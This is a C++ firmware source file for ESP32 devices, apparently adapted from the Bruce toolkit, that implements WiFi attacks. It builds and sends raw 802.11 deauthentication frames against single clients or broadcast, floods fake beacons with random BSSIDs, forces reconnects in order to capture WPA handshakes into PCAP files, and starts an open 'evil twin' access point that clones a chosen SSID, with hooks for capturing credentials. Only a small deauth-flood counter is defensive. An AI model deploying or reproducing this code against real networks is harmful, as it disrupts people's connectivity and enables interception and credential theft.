/**
 * @file BruceWiFi.cpp
 * @brief Lean WiFi attack adapter - extracted essentials from Bruce
 *
 * Contains only the raw frame logic needed for attacks.
 * No menu code, no UI code, no bloat.
 */

#include "BruceWiFi.h"
#include "../core/VanguardEngine.h"
#include "../core/SDManager.h"
#include "../core/PCAPWriter.h"
#include <WiFi.h>
#include <esp_err.h>
#include "../core/RadioWarden.h"

namespace Vanguard {

// Static instance for promiscuous callback
BruceWiFi* BruceWiFi::s_instance = nullptr;

// =============================================================================
// FRAME TEMPLATES (from Bruce wifi_atks.h)
// =============================================================================

// Deauth frame: 26 bytes
// [0-1]   Frame control (0xC0 0x00 = deauth)
// [2-3]   Duration
// [4-9]   Destination MAC (target client or broadcast)
// [10-15] Source MAC (AP BSSID)
// [16-21] BSSID
// [22-23] Sequence
// [24-25] Reason code (0x02 = Previous auth no longer valid)
static const uint8_t DEAUTH_FRAME_TEMPLATE[] = {
    0xC0, 0x00,                         // Frame control: Deauth
    0x3A, 0x01,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
    0xF0, 0xFF,                         // Sequence
    0x02, 0x00                          // Reason: Auth no longer valid
};
constexpr size_t DEAUTH_FRAME_LEN = sizeof(DEAUTH_FRAME_TEMPLATE);

// Beacon frame: 109 bytes (simplified)
static const uint8_t BEACON_FRAME_TEMPLATE[] = {
    0x80, 0x00,                         // Frame control: Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
    0x00, 0x00,                         // Sequence
    // Timestamp (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Beacon interval
    0x64, 0x00,
    // Capability info
    0x31, 0x04,
    // SSID element (tag 0, length, then SSID bytes)
    0x00, 0x20,  // Tag: SSID, Length: 32 (max)
    // 32 bytes for SSID (padded with spaces)
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    // Supported rates
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    // DS Parameter Set (channel)
    0x03, 0x01, 0x01,  // Channel: To be filled at byte 82
    // TIM
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
};
constexpr size_t BEACON_FRAME_LEN = sizeof(BEACON_FRAME_TEMPLATE);
constexpr size_t BEACON_SSID_OFFSET = 38;
constexpr size_t BEACON_SSID_LEN_OFFSET = 37;
constexpr size_t BEACON_CHANNEL_OFFSET = 82;
constexpr size_t BEACON_SRC_OFFSET = 10;
constexpr size_t BEACON_BSSID_OFFSET = 16;

// =============================================================================
// SINGLETON
// =============================================================================

BruceWiFi& BruceWiFi::getInstance() {
    static BruceWiFi instance;
    return instance;
}

BruceWiFi::BruceWiFi()
    : m_state(WiFiAdapterState::IDLE)
    , m_initialized(false)
    , m_promiscuousEnabled(false)
    , m_currentChannel(1)
    , m_packetsSent(0)
    , m_lastPacketMs(0)
    , m_handshakeCaptured(false)
    , m_beaconSsids(nullptr)
    , m_beaconSsidCount(0)
    , m_beaconCurrentIndex(0)
    , m_beaconChannel(1)
    , m_evilTwinChannel(1)
    , m_evilTwinDeauth(false)
    , m_pcapWriter(nullptr)
    , m_deauthCount(0)
    , m_eapolCount(0)
    , m_lastWidsCheckMs(0)
{
    memset(m_attackTargetMac, 0, 6);
    memset(m_attackApMac, 0, 6);
    memset(m_evilTwinSSID, 0, sizeof(m_evilTwinSSID));
    s_instance = this;
}

BruceWiFi::~BruceWiFi() {
    shutdown();
    s_instance = nullptr;
}

// =============================================================================
// LIFECYCLE
// =============================================================================

bool BruceWiFi::onEnable() {
    if (m_enabled) return true;
    
    if (RadioWarden::getInstance().requestRadio(RadioOwner::OWNER_WIFI_STA)) {
        m_enabled = true;
        m_state = WiFiAdapterState::IDLE;
        return true;
    }
    return false;
}

void BruceWiFi::onDisable() {
    if (!m_enabled) return;
    
    stopHardwareActivities();
    setPromiscuous(false);
    // Warden handles the low-level esp_wifi_stop()
    m_enabled = false;
    m_state = WiFiAdapterState::IDLE;
}

bool BruceWiFi::init() {
    // Legacy init now delegates to Warden via onEnable
    return onEnable();
}

void BruceWiFi::shutdown() {
    // Legacy shutdown now delegates to onDisable
    onDisable();
}

void BruceWiFi::onTick() {
    // WIDS Background Check (every 1 second)
    // Only check if promiscuous mode is active and we are not attacking (to avoid self-trigger)
    if (m_promiscuousEnabled && m_state != WiFiAdapterState::DEAUTHING && m_state != WiFiAdapterState::BEACON_FLOODING) {
        uint32_t now = millis();
        if (now - m_lastWidsCheckMs >= 1000) {
            // Check thresholds
            // > 10 deauths/sec = Flood
            if (m_deauthCount > 10) {
                if (m_onWidsAlert) m_onWidsAlert(WidsEventType::DEAUTH_FLOOD, m_deauthCount);
            }
            // > 20 EAPOLs/sec = Flood possibly
            if (m_eapolCount > 20) {
                if (m_onWidsAlert) m_onWidsAlert(WidsEventType::EAPOL_FLOOD, m_eapolCount);
            }
            // Reset counters for next second
            m_deauthCount = 0;
            m_eapolCount = 0;
            m_lastWidsCheckMs = now;
        }
    }

    switch (m_state) {
        case WiFiAdapterState::SCANNING:
            tickScan();
            break;
        case WiFiAdapterState::DEAUTHING:
            tickDeauth();
            break;
        case WiFiAdapterState::BEACON_FLOODING:
            tickBeaconFlood();
            break;
        case WiFiAdapterState::CAPTURING_HANDSHAKE:
            tickHandshakeCapture();
            break;
        case WiFiAdapterState::MONITORING:
            tickMonitor();
            break;
        default:
            break;
    }
}

void BruceWiFi::tick() {
    // Legacy tick delegates to onTick
    if (m_enabled) onTick();
}

WiFiAdapterState BruceWiFi::getState() const {
    return m_state;
}

// =============================================================================
// SCANNING (Async)
// =============================================================================

void BruceWiFi::beginScan() {
    if (!m_enabled && !onEnable()) return;

    if (m_state != WiFiAdapterState::IDLE) {
        stopHardwareActivities();
    }

    // Passive scan is more stable and catches stealthy APs
    // 120ms dwell time per channel
    WiFi.scanNetworks(true, true, true, 120); 
    m_state = WiFiAdapterState::SCANNING;
}

void BruceWiFi::stopScan() {
    WiFi.scanDelete();
    m_state = WiFiAdapterState::IDLE;
}

bool BruceWiFi::isScanComplete() const {
    return WiFi.scanComplete() >= 0;
}

int BruceWiFi::getScanResultCount() const {
    int result = WiFi.scanComplete();
    return (result >= 0) ? result : 0;
}

bool BruceWiFi::getScanResult(int index, ScanResultEntry& result) const {
    int count = WiFi.scanComplete();
    if (count < 0 || index >= count) {
        return false;
    }

    // Copy BSSID
    uint8_t* bssid = WiFi.BSSID(index);
    if (bssid) {
        memcpy(result.bssid, bssid, 6);
    }

    // Copy SSID
    String ssid = WiFi.SSID(index);
    strncpy(result.ssid, ssid.c_str(), 32);
    result.ssid[32] = '\0';

    result.rssi = WiFi.RSSI(index);
    result.channel = WiFi.channel(index);
    result.encryptionType = WiFi.encryptionType(index);

    return true;
}

void BruceWiFi::onScanComplete(ScanCompleteCallback cb) {
    m_onScanComplete = cb;
}

void BruceWiFi::tickScan() {
    int result = WiFi.scanComplete();
    if (result >= 0) {
        m_state = WiFiAdapterState::IDLE;
        if (m_onScanComplete) {
            m_onScanComplete(result);
        }
    }
}

// =============================================================================
// DEAUTHENTICATION
// =============================================================================

bool BruceWiFi::deauthStation(const uint8_t* stationMac,
                               const uint8_t* apMac,
                               uint8_t channel) {
    if (!m_initialized) return false;

    stopHardwareActivities();
    setChannel(channel);

    memcpy(m_attackTargetMac, stationMac, 6);
    memcpy(m_attackApMac, apMac, 6);
    m_packetsSent = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::DEAUTHING;

    return true;
}

bool BruceWiFi::deauthAll(const uint8_t* apMac, uint8_t channel) {
    // Broadcast deauth - target FF:FF:FF:FF:FF:FF
    static const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return deauthStation(broadcast, apMac, channel);
}

void BruceWiFi::tickDeauth() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < DEAUTH_INTERVAL_MS) {
        return;
    }
    m_lastPacketMs = now;

    // Build deauth frame
    uint8_t frame[DEAUTH_FRAME_LEN];
    memcpy(frame, DEAUTH_FRAME_TEMPLATE, DEAUTH_FRAME_LEN);

    // Set destination (client or broadcast)
    memcpy(&frame[4], m_attackTargetMac, 6);
    // Set source (AP BSSID)
    memcpy(&frame[10], m_attackApMac, 6);
    // Set BSSID
    memcpy(&frame[16], m_attackApMac, 6);

    // Send frame 3 times (like Bruce does)
    sendRawFrame(frame, DEAUTH_FRAME_LEN);
    sendRawFrame(frame, DEAUTH_FRAME_LEN);
    sendRawFrame(frame, DEAUTH_FRAME_LEN);
    m_packetsSent += 3;

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// BEACON FLOOD
// =============================================================================

// Beacon flood state is now in class members (m_beaconSsids, etc.)

bool BruceWiFi::beaconFlood(const char** ssids, size_t count, uint8_t channel) {
    if (!m_initialized || count == 0) return false;

    stopHardwareActivities();
    setChannel(channel);

    m_beaconSsids = ssids;
    m_beaconSsidCount = count;
    m_beaconCurrentIndex = 0;
    m_beaconChannel = channel;

    m_packetsSent = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::BEACON_FLOODING;

    return true;
}

bool BruceWiFi::cloneBeacon(const char* ssid,
                             const uint8_t* bssid,
                             uint8_t channel) {
    static const char* singleSsid[1];
    singleSsid[0] = ssid;

    // Store BSSID to use (or generate random if null)
    if (bssid) {
        memcpy(m_attackApMac, bssid, 6);
    } else {
        // Random MAC
        for (int i = 0; i < 6; i++) {
            m_attackApMac[i] = random(256);
        }
        m_attackApMac[0] &= 0xFE;  // Unicast
        m_attackApMac[0] |= 0x02;  // Locally administered
    }

    return beaconFlood(singleSsid, 1, channel);
}

void BruceWiFi::tickBeaconFlood() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < BEACON_INTERVAL_MS) {
        return;
    }
    m_lastPacketMs = now;

    if (!m_beaconSsids || m_beaconSsidCount == 0) {
        m_state = WiFiAdapterState::IDLE;
        return;
    }

    // Build beacon frame
    uint8_t frame[BEACON_FRAME_LEN];
    memcpy(frame, BEACON_FRAME_TEMPLATE, BEACON_FRAME_LEN);

    // Generate random BSSID for this beacon
    uint8_t bssid[6];
    for (int i = 0; i < 6; i++) {
        bssid[i] = random(256);
    }
    bssid[0] &= 0xFE;  // Unicast
    bssid[0] |= 0x02;  // Locally administered

    // Set source and BSSID
    memcpy(&frame[BEACON_SRC_OFFSET], bssid, 6);
    memcpy(&frame[BEACON_BSSID_OFFSET], bssid, 6);

    // Set SSID
    const char* ssid = m_beaconSsids[m_beaconCurrentIndex];
    size_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    frame[BEACON_SSID_LEN_OFFSET] = ssidLen;
    memset(&frame[BEACON_SSID_OFFSET], 0, 32);
    memcpy(&frame[BEACON_SSID_OFFSET], ssid, ssidLen);

    // Set channel
    frame[BEACON_CHANNEL_OFFSET] = m_beaconChannel;

    // Send beacon
    sendRawFrame(frame, BEACON_FRAME_LEN);
    m_packetsSent++;

    // Rotate to next SSID
    m_beaconCurrentIndex = (m_beaconCurrentIndex + 1) % m_beaconSsidCount;

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// HANDSHAKE CAPTURE (Stub - needs promiscuous mode)
// =============================================================================

bool BruceWiFi::captureHandshake(const uint8_t* apMac,
                                  uint8_t channel,
                                  bool sendDeauth) {
    if (!m_initialized) return false;

    stopHardwareActivities();
    setChannel(channel);
    setPromiscuous(true);

    memcpy(m_attackApMac, apMac, 6);
    m_handshakeCaptured = false;
    m_state = WiFiAdapterState::CAPTURING_HANDSHAKE;

    // Optionally send deauth to force reconnect
    if (sendDeauth) {
        static const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(m_attackTargetMac, broadcast, 6);
    }

    return true;
}

bool BruceWiFi::hasHandshake() const {
    return m_handshakeCaptured;
}

bool BruceWiFi::saveHandshake(const char* filename) {
    // If we have a PCAP writer with captured data, flush and return success
    if (m_pcapWriter && m_handshakeCaptured) {
        m_pcapWriter->flush();
        if (Serial) Serial.printf("[WiFi] Handshake saved to PCAP\n");
        return true;
    }
    return false;
}

void BruceWiFi::onHandshakeCaptured(HandshakeCapturedCallback cb) {
    m_onHandshakeCaptured = cb;
}

void BruceWiFi::tickHandshakeCapture() {
    // Send periodic deauth to force reconnection
    uint32_t now = millis();
    if (now - m_lastPacketMs >= 500) {  // Every 500ms
        m_lastPacketMs = now;

        uint8_t frame[DEAUTH_FRAME_LEN];
        memcpy(frame, DEAUTH_FRAME_TEMPLATE, DEAUTH_FRAME_LEN);
        memcpy(&frame[4], m_attackTargetMac, 6);
        memcpy(&frame[10], m_attackApMac, 6);
        memcpy(&frame[16], m_attackApMac, 6);

        sendRawFrame(frame, DEAUTH_FRAME_LEN);
        m_packetsSent++;
    }

    // Handshake detection happens in promiscuous callback
}

// =============================================================================
// EVIL TWIN
// =============================================================================

// Evil Twin state is now in class members (m_evilTwinSSID, etc.)

bool BruceWiFi::startEvilTwin(const char* ssid,
                               uint8_t channel,
                               bool sendDeauth) {
    if (!ssid || strlen(ssid) == 0) return false;

    stopHardwareActivities();

    // Save config
    strncpy(m_evilTwinSSID, ssid, 32);
    m_evilTwinSSID[32] = '\0';
    m_evilTwinChannel = channel;
    m_evilTwinDeauth = sendDeauth;

    // Stop station mode
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);

    // Start soft AP with cloned SSID (open network)
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                      IPAddress(192, 168, 4, 1),
                      IPAddress(255, 255, 255, 0));

    if (!WiFi.softAP(m_evilTwinSSID, "", m_evilTwinChannel)) {
        if (Serial) {
            Serial.println("[WiFi] Failed to start Evil Twin AP");
        }
        WiFi.mode(WIFI_STA);
        return false;
    }

    if (Serial) {
        Serial.printf("[WiFi] Evil Twin started: %s on ch%d\n", m_evilTwinSSID, m_evilTwinChannel);
        Serial.printf("[WiFi] AP IP: %s\n", WiFi.softAPIP().toString().c_str());
    }

    m_state = WiFiAdapterState::EVIL_TWIN_ACTIVE;
    m_packetsSent = 0;
    m_lastPacketMs = millis();

    // Note: Full captive portal requires WebServer and DNSServer
    // For now, just creates the fake AP - clients will see it

    return true;
}

void BruceWiFi::stopEvilTwin() {
    if (m_state == WiFiAdapterState::EVIL_TWIN_ACTIVE) {
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        delay(100);
        WiFi.mode(WIFI_STA);

        if (Serial) {
            Serial.println("[WiFi] Evil Twin stopped");
        }

        m_state = WiFiAdapterState::IDLE;
    }
}

int BruceWiFi::getCapturedCredentialCount() const {
    // Delegate to EvilPortal for actual count
    return 0;  // EvilPortal tracks its own credentials
}

void BruceWiFi::onCredentialCaptured(CredentialCapturedCallback cb) {
    m_onCredentialCaptured = cb;
}

// =============================================================================
// PASSIVE MONITORING
// =============================================================================

bool BruceWiFi::startMonitor(uint8_t channel) {
    if (!m_initialized) return false;

    stopHardwareActivities();
    if (channel > 0) {
        setChannel(channel);
    }
    setPromiscuous(true);

    m_state = WiFiAdapterState::MONITORING;
    return true;
}

void BruceWiFi::stopMonitor() {
    if (m_state == WiFiAdapterState::MONITORING) {
        setPromiscuous(false);
        m_state = WiFiAdapterState::IDLE;
    }
}

void BruceWiFi::onPacketReceived(PacketCallback cb) {
    m_onPacketReceived = cb;
}

void BruceWiFi::tickMonitor() {
    // Packet handling happens in promiscuous callback
}

// =============================================================================
// ATTACK CONTROL
// =============================================================================

void BruceWiFi::stopHardwareActivities() {
    // Stop Evil Twin if running
    if (m_state == WiFiAdapterState::EVIL_TWIN_ACTIVE) {
        stopEvilTwin();
    }

    setPromiscuous(false);
    setPcapLogging(false); // Ensure PCAP closed
    m_state = WiFiAdapterState::IDLE;
    m_packetsSent = 0;
    m_eapolCount = 0;
}

uint32_t BruceWiFi::getPacketsSent() const {
    return m_packetsSent;
}

void BruceWiFi::onAttackProgress(AttackProgressCallback cb) {
    m_onAttackProgress = cb;
}

void BruceWiFi::onWidsAlert(WidsCallback cb) {
    m_onWidsAlert = cb;
}

// =============================================================================
// LOW-LEVEL
// =============================================================================

bool BruceWiFi::sendRawFrame(const uint8_t* frame, size_t len) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    return (result == ESP_OK);
}

bool BruceWiFi::setChannel(uint8_t channel) {
    if (channel < 1 || channel > 14) return false;

    esp_err_t result = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (result == ESP_OK) {
        m_currentChannel = channel;
        return true;
    }
    return false;
}

bool BruceWiFi::setPromiscuous(bool enable) {
    esp_err_t result;

    if (enable && !m_promiscuousEnabled) {
        esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
        result = esp_wifi_set_promiscuous(true);
        m_promiscuousEnabled = (result == ESP_OK);
    } else if (!enable && m_promiscuousEnabled) {
        result = esp_wifi_set_promiscuous(false);
        m_promiscuousEnabled = false;
    }

    return m_promiscuousEnabled == enable;
}

// =============================================================================
// PROMISCUOUS CALLBACK
// =============================================================================

void BruceWiFi::setPcapLogging(bool enabled, const char* filename) {
    if (m_pcapWriter) {
        m_pcapWriter->close();
        delete m_pcapWriter;
        m_pcapWriter = nullptr;
    }

    if (enabled && filename) {
        m_pcapWriter = new PCAPWriter(filename);
        if (!m_pcapWriter->open()) {
            if (Serial) Serial.println("[WiFi] PCAP open failed!");
            delete m_pcapWriter;
            m_pcapWriter = nullptr;
        } else {
            if (Serial) Serial.printf("[WiFi] Logging to %s\n", filename);
        }
    }
}

void BruceWiFi::onAssociation(AssociationCallback cb) {
    m_onAssociation = cb;
}

void BruceWiFi::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_instance) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;

    // [PHASE 3.3] PCAP Logging
    if (s_instance->m_pcapWriter) {
        s_instance->m_pcapWriter->writePacket(payload, len);
    }

    // Forward to packet callback if registered
    if (s_instance->m_onPacketReceived) {
        s_instance->m_onPacketReceived(payload, len, rssi);
    }

    // [PHASE 2.2] WIDS Detection
    // Check for Deauth frames (Mgmt type, subtype 0xC = Deauth, 0xA = Disassoc)
    if (type == WIFI_PKT_MGMT) {
        // Frame Control is first 2 bytes. 
        // 0xC0 = Deauth, 0xA0 = Disassoc (assuming little endian payload[0])
        // Mask 0xFC to check type/subtype
        uint8_t subtype = payload[0];
        if (subtype == 0xC0 || subtype == 0xA0) {
            s_instance->m_deauthCount++;
        }
    }

    // [PHASE 3.1] Client Discovery Implementation
    // We only care about Data frames for client discovery
    if (type == WIFI_PKT_DATA) {
        wifi_data_frame_header_t* header = (wifi_data_frame_header_t*)payload;
        
        // Extract Frame Control bits
        uint16_t fc = header->frame_control;
        bool toDs = (fc & 0x0100) != 0;
        bool fromDs = (fc & 0x0200) != 0;

        // In 802.11 Data Frames:
        // ToDS=0, FromDS=0: Addr1=Dst, Addr2=Src (Client), Addr3=BSSID (AP)
        // ToDS=1, FromDS=0: Addr1=BSSID (AP), Addr2=Src (Client), Addr3=Dst
        // ToDS=0, FromDS=1: Addr1=Dst, Addr2=BSSID (AP), Addr3=Src (Client)
        // ToDS=1, FromDS=1: WDS (Ignore)

        const uint8_t* clientMac = nullptr;
        const uint8_t* apMac = nullptr;

        if (!toDs && !fromDs) {
            clientMac = header->addr2;
            apMac = header->addr3;
        } else if (toDs && !fromDs) {
            clientMac = header->addr2;
            apMac = header->addr1;
        } else if (!toDs && fromDs) {
            clientMac = header->addr3;
            apMac = header->addr2;
        }

        // If we found a valid mapping, send to association callback
        if (clientMac && apMac && s_instance->m_onAssociation) {
            // Check if client is not broadcast/multicast
            if (!(clientMac[0] & 0x01)) {
                s_instance->m_onAssociation(clientMac, apMac);
            }
        }
    }

    // [PHASE 3.3] Handshake Capture
    // EAPOL Detection
    if (type == WIFI_PKT_DATA) {
        // EtherType for EAPOL is 0x888e
        // In 802.11 Data frames, the payload starts after the header
        // For QoS Data, header is 26 bytes. For Data, header is 24 bytes.
        // But wifi_data_frame_header_t handles basic fields.
        // SNAP header (8 bytes) usually precedes the EAPOL payload.
        // Index 24-25 is often the length/type in some captures, but 
        // 802.11 stack usually gives us the 802.2 LLC/SNAP header.
        
        // Simpler check: EAPOL frames are small and have a specific structure.
        // We look for 0x88 0x8e in the payload.
        for (int i = 0; i < len - 1; i++) {
            if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
                // Found potential EAPOL!
                s_instance->m_eapolCount++;
                
                if (s_instance->m_onHandshakeCaptured) {
                    // In a real handshake, we'd captures multiple parts. 
                    // For now, signal that we saw EAPOL for this BSSID.
                    wifi_data_frame_header_t* header = (wifi_data_frame_header_t*)payload;
                    s_instance->m_onHandshakeCaptured(header->addr3); // Addr3 is BSSID
                }
                break;
            }
        }
    }
}

} // namespace Vanguard
